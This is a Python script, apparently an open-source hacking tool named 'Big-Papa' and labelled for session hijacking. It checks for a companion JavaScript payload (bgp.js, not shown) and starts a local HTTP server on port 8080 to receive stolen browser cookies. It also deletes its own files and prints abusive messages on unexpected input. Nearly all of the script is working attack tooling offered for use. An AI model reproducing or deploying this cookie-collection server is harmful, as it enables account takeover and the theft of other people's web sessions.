#By SxNade
#https://github.com/SxNade/Big-Papa
#CONTRIBUTE
#HIJACK SESSIONS

# This is the most shit code I ever wrote :) 

import os
import sys
import time
import subprocess
from termcolor import colored
#importing the required libraries

golo = '''
				 ______ _______ _______        ______ _______ ______ _______ 
				|   __ \_     _|     __|______|   __ \   _   |   __ \   _   |
				|   __ <_|   |_|    |  |______|    __/       |    __/       |
				|______/_______|_______|      |___|  |___|___|___|  |___|___|




					███████████████████████████████─
					──────▀█▄▀▄▀████▀──▀█▄▀▄▀████▀──
					────────▀█▄█▄█▀──────▀█▄█▄█▀────
					           

                                      *By SxNade https://github.com/SxNade
'''

print(golo)
time.sleep(1.5)
print("BIG-PAPA V1.0-beta starting now....")
time.sleep(2)

#definig a function to run the main server
def shoot():
	if os.path.exists('bgp.js') == False:
		print(colored("\n\n[f**k] Javscript File Not Found..exiting now!\n", "red", attrs=['bold']))
		sys.exit(0)
	else:
		print(colored("\n\n[*] Javscript File Found", "red", attrs=['bold']))
		print(colored("\n[*]Starting HTTP Server For Receving Cookies", "green", attrs=['bold']))
		time.sleep(2)
		os.system("clear")
		try:
			print(golo)
			print(colored("------<Server Online>-----", "green"))
			print(colored("[#]Awaiting For Requests with cookies"))
			subprocess.call("python3 -m http.server 8080", shell=True)
			#starting the python server awaiting for http get requests with cookies.....!
		except KeyboardInterrupt:
			ask = input(colored("\n\nDo you want to quit Big-Papa?...Y/N: ", "red", attrs=['bold']))
			if ask == 'Y':
				print("\n\n[+]Stopping Big-Papa....\n\n")
				sys.exit(0)
			elif ask == 'N':
				pass
			else:
				#sorry for this...........!!!
				print("\n\n[#&*]Fuck You unexpected input....")
				print("\n[+!+]Leaving This System now....fuck you asshole")
				os.remove("Big_Papa.py")
				os.remove("bgp.js")
				print("\n\n[#]By piece of shit....!!")
				
#Defining the main function containing the shoot function
def main():
	shoot()

main()
#Finally running the main function to run the whole code..
